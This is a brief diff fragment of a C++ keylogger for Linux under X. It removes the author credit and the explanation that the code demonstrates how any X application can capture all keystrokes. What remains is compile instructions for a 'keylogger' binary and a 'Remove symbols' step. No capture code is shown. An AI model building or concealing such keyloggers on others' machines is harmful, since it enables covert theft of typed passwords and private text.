@@ -1,9 +1,4 @@
-/**
- * Tuxicoman https://framagit.org/u/tuxicoman
- *
- * C++ keylogger for Linux with Xserver.
- * This code illustrates that every X application can listen to the whole keyboard events, even if it does not get the focus.
- *
+/*
  * Compile:
  *  g++ -ansi -Wall -Wno-deprecated-declarations -pedantic -O3 -o keylogger keylogger.cpp -L/usr/X11R6/lib -lX11
  * Remove symbols:
